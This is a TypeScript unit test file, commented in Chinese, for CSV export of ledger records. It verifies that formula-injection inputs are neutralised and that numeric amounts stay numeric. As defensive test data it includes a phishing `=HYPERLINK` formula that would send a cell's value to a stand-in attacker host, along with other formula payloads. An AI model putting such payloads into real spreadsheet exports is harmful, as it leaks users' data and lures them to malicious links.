// MED-2（11-06 QA）：CSV 匯出防公式注入。規則對齊 CRM lib/csv/cell.ts：
// 字串開頭 = + - @ \t \r 前面加 '、字串一律加雙引號；數字金額不動。不需要資料庫。
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { csvCell, csvRow, ledgerExportCsv } from '../src/lib/csv';

test('=HYPERLINK 釣魚連結被中和：前面加單引號、整格加引號、內部引號跳脫', () => {
  const evil = '=HYPERLINK("https://evil.example/?d="&A1,"點我領獎")';
  assert.equal(csvCell(evil), `"'=HYPERLINK(""https://evil.example/?d=""&A1,""點我領獎"")"`);
});

test('每個危險開頭字元都加單引號（含 \t、\r）；已經有單引號的再多加一個（匯入端對稱拿一個）', () => {
  for (const s of ['=1+1', '+886912345678', '-1+1', '@SUM(A1)', '\tcmd', '\rcmd', "'=x"]) {
    const c = csvCell(s);
    assert.ok(c.startsWith(`"'`), `${JSON.stringify(s)} → ${c}`);
    assert.ok(c.endsWith('"'));
  }
  assert.equal(csvCell("'=x"), `"''=x"`);
  assert.equal(csvCell('\r\n=1'), `"'\r\n=1"`, '\r 開頭也加引號，不會把列切開');
});

test('數字金額不動（不加引號、不加單引號，負數照常加總）；一般文字一律加引號', () => {
  assert.equal(csvCell(120), '120');
  assert.equal(csvCell(-35.5), '-35.5');
  assert.equal(csvCell(Number.NaN), '');
  assert.equal(csvCell('午餐'), '"午餐"');
  assert.equal(csvCell('a,b\nc'), '"a,b\nc"');
  assert.equal(csvCell(null), '""');
  assert.equal(csvRow(['午餐', 120, '=1']), `"午餐",120,"'=1"`);
});

test('記帳簿匯出整份：BOM、表頭、備註裡的公式被中和、金額欄是數字', () => {
  const csv = ledgerExportCsv([
    { paidAt: '2026-10-20T04:00:00.000Z', type: 'EXPENSE', categoryName: '餐飲', accountName: '現金', note: '=HYPERLINK("https://evil.example","x")', amount: 120, memberName: '@Shark', source: 'TEXT' },
  ]);
  assert.ok(csv.startsWith('﻿'));
  const [header, row] = csv.slice(1).split('\r\n');
  assert.equal(header, '"日期","類型","分類","帳戶","備註","金額","記錄者","來源"');
  assert.equal(row, `"2026-10-20","支出","餐飲","現金","'=HYPERLINK(""https://evil.example"",""x"")",120,"'@Shark","TEXT"`);
});

// 11-06 fix/ledger-csv-formula-injection：金額欄改走 csvNumberCell（純數字判斷同 CRM `^-?\d+(\.\d+)?$`）。
import { csvNumberCell } from '../src/lib/csv';

test('金額欄 csvNumberCell：number／Decimal／純數字字串都保持數字，負數不加 \'', () => {
  assert.equal(csvNumberCell(-35.5), '-35.5');
  assert.equal(csvNumberCell(0), '0');
  assert.equal(csvNumberCell('-120'), '-120');
  assert.equal(csvNumberCell(' 120.50 '), '120.50');
  assert.equal(csvNumberCell(12n), '12');
  // 模擬 Prisma Decimal：物件、toString 回數字字串
  assert.equal(csvNumberCell({ toString: () => '-1999.99' }), '-1999.99');
  assert.equal(csvNumberCell(Number.POSITIVE_INFINITY), '');
});

test('金額欄被塞了不是純數字的東西：退回文字並中和（-1+1、+100、-.5、=1、1e3）', () => {
  assert.equal(csvNumberCell('-1+1'), `"'-1+1"`);
  assert.equal(csvNumberCell('+100'), `"'+100"`);
  assert.equal(csvNumberCell('-.5'), `"'-.5"`);
  assert.equal(csvNumberCell('=1'), `"'=1"`);
  assert.equal(csvNumberCell('1e3'), '"1e3"');
  assert.equal(csvNumberCell({ toString: () => '=HYPERLINK("x")' }), `"'=HYPERLINK(""x"")"`);
  assert.equal(csvNumberCell(null), '""');
});

test('文字欄長得像負數也加 \'（跟金額欄不同口徑）', () => {
  assert.equal(csvCell('-1'), `"'-1"`);
  assert.equal(csvCell('-120'), `"'-120"`);
});

test('含逗號、換行、雙引號、中文：整格加引號、引號跳脫，切欄不會錯位', () => {
  assert.equal(csvCell('早餐,午餐'), '"早餐,午餐"');
  assert.equal(csvCell('第一行\r\n第二行'), '"第一行\r\n第二行"');
  assert.equal(csvCell('他說"好"'), '"他說""好"""');
  assert.equal(csvCell('"=1"'), '"""=1"""', '引號開頭不是公式字元，Excel 讀回是 "=1" 字串');
  assert.equal(csvCell('全聯 福利中心'), '"全聯 福利中心"');
});

// 簡易 RFC 4180 解析（測試用）：確認整份檔讀回來的欄位跟原始值一致、列數正確
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let q = false;
  for (let i = 0; i < text.length; i++) {
    const ch = text[i];
    if (q) {
      if (ch === '"' && text[i + 1] === '"') { cell += '"'; i++; }
      else if (ch === '"') q = false;
      else cell += ch;
    } else if (ch === '"') q = true;
    else if (ch === ',') { row.push(cell); cell = ''; }
    else if (ch === '\r' && text[i + 1] === '\n') { row.push(cell); rows.push(row); row = []; cell = ''; i++; }
    else cell += ch;
  }
  row.push(cell);
  rows.push(row);
  return rows;
}

test('整份匯出：負數金額是數字、備註有逗號換行引號中文與公式，讀回欄位數與內容都對', () => {
  const note = '退款,"多收"\n=SUM(A1:A9)';
  const csv = ledgerExportCsv([
    { paidAt: '2026-10-20T04:00:00.000Z', type: 'INCOME', categoryName: '退款', accountName: null, note, amount: -250, memberName: '小龜', source: 'LIFF' },
    { paidAt: '2026-10-21T04:00:00.000Z', type: 'EXPENSE', categoryName: '+加購', accountName: '-信用卡', note: null, amount: { toString: () => '99.90' }, memberName: 'Apple', source: 'TEXT' },
  ]);
  const rows = parseCsv(csv.slice(1));
  assert.equal(rows.length, 3);
  for (const r of rows) assert.equal(r.length, 8);
  assert.deepEqual(rows[1], ['2026-10-20', '收入', '退款', '', note, '-250', '小龜', 'LIFF']);
  assert.deepEqual(rows[2], ['2026-10-21', '支出', "'+加購", "'-信用卡", '', '99.90', 'Apple', 'TEXT']);
  // 原始字串：負數金額不帶引號（Excel 視為數字）
  assert.ok(csv.includes(',-250,'));
  assert.ok(csv.includes(',99.90,'));
});
